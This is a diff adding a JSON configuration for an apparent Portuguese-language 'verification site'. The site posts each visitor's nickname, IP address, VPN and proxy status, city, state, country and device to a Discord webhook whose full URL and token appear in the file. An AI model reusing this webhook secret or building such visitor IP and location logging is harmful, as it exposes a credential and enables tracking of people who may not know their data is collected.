@@ -1,0 +1,21 @@
+{
+    "//": "=== Configuração do Site de Verificação ===",
+    "webhook": "https://discord.com/api/webhooks/1360595060672040990/aAy8Yj1c9iQ3rVH_lg9R3qwA4_G_omtJMNTH8_jf69idGoP3Fa7qshl3dd7XVNld7Kwh",
+    "embed": {
+        "title": "Nova Verificação",
+        "color": "#FF0000",
+        "fields": [
+            { "name": "**Nome**", "key": "nick" },
+            { "name": "**Data**", "key": "date" },
+            { "name": "**Vpn**", "key": "vpn" },
+            { "name": "**Proxy**", "key": "proxy" },
+            { "name": "**IP**", "key": "ip" },
+            { "name": "**Loc**", "key": "loc" },
+            { "name": "**Cidade**", "key": "cidade" },
+            { "name": "**Estado**", "key": "estado" },
+            { "name": "**Pais**", "key": "pais" },
+            { "name": "**Dispositivo**", "key": "dispositivo" }
+        ]
+    },
+    "//": "=== Fim das Configurações ==="
+}
